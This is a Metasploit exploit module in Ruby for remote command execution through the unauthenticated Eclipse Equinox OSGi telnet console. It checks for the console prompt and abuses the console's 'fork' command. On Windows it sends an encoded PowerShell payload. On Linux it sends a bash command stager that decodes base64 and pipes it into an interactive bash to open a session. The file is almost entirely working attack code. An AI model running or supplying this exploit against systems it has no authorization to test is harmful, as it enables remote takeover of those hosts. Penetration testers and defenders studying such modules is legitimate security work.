# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;base64&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  TELNET_IAC = Msf::Exploit::Remote::Telnet

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Eclipse Equinoxe OSGi Console Command Execution&#039;,
      &#039;Description&#039;    => %q{
        Exploit Eclipse Equinoxe OSGi (Open Service Gateway initiative) console
        &#039;fork&#039; command to execute arbitrary commands on the remote system..
      },
      &#039;Author&#039;         =>
        [
          &#039;Quentin Kaiser <kaiserquentin@gmail.com>&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
       [
         [&#039;URL&#039;, &#039;https://www.eclipse.org/equinox/documents/quickstart-framework.php&#039;]
       ],
      &#039;Platform&#039; => %w{ linux win },
      &#039;Arch&#039; => [ARCH_ARMLE, ARCH_AARCH64, ARCH_X86, ARCH_X64],
      &#039;Targets&#039;=> [
        [ &#039;Linux (Bash Payload)&#039;, { &#039;Platform&#039; => &#039;linux&#039; } ],
        [ &#039;Windows (Powershell Payload)&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
       ],
      &#039;CmdStagerFlavor&#039; => [ &#039;bourne&#039; ],
      &#039;DisclosureDate&#039;  => &#039;Feb 13 2018&#039;,
      &#039;DefaultTarget&#039;   => 0))
    deregister_options(&#039;SRVHOST&#039;, &#039;SRVPORT&#039;, &#039;SSL&#039;, &#039;SSLCert&#039;, &#039;URIPATH&#039;)
    register_options([
      OptInt.new(&#039;TIME_WAIT&#039;, [ true, &#039;Time to wait for payload to be executed&#039;, 20])
    ])
  end

  def check
    connect
    res = sock.get_once
    if res == TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_ECHO+\
        TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_SGA+\
        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_NAWS+\
        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_TTYPE
      # terminal type &#039;xterm-256color&#039; = \x78\x74\x65\x72\x6D\x2D\x32\x35\x36\x63\x6F\x6C\x6F\x72
      sock.put(TELNET_IAC::IAC+TELNET_IAC::SB+TELNET_IAC::OPT_TTYPE+\
        "\x00xterm-256color"+TELNET_IAC::IAC+TELNET_IAC::SE)
      res = sock.get_once
    end
    disconnect
    if res && res == "osgi> "
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    begin
      print_status("Accessing the OSGi console ...")

      unless check == Exploit::CheckCode::Vulnerable
        fail_with(Failure::NoTarget, "#{peer} - Failed to access the OSGi console")
      end

      if target[&#039;Platform&#039;] == "win" then
        exec_command("fork \"#{cmd_psh_payload(payload.encoded, payload_instance.arch.first, {encode_final_payload: true, remove_comspec: true})}\"")
      else
        execute_cmdstager({:flavor => :bourne})
      end

      print_status("#{rhost}:#{rport} - Waiting for session...")

      (datastore[&#039;TIME_WAIT&#039;]).times do
        Rex.sleep(1)
        # Success! session is here!
        break if session_created?
      end
    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout => e
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - #{e.message}")
    ensure
      disconnect
    end
  end

  def exec_command(cmd)
      connect
      res = sock.get_once
      if res == TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_ECHO+\
        TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_SGA+\
        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_NAWS+\
        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_TTYPE
        sock.put(TELNET_IAC::IAC+TELNET_IAC::SB+TELNET_IAC::OPT_TTYPE+\
          "\x00xterm-256color"+TELNET_IAC::IAC+TELNET_IAC::SE)
        res = sock.get_once
      end
      print_status("Exploiting...")
      sock.put("#{cmd}\r\n")
      res = sock.get
      sock.put("disconnect\r\n")
      res = sock.get
      sock.put("y\r\n")
  end

  def execute_command(cmd, opts={})
    cmd_b64 = Base64.encode64(cmd).gsub(/\s+/, "")
    # Runtime.getRuntime().exec() workaround on Linux. Requires bash.
    exec_command("fork \"bash -c {echo,#{cmd_b64}}|{base64,-d}|{bash,-i}\"")
  end
end

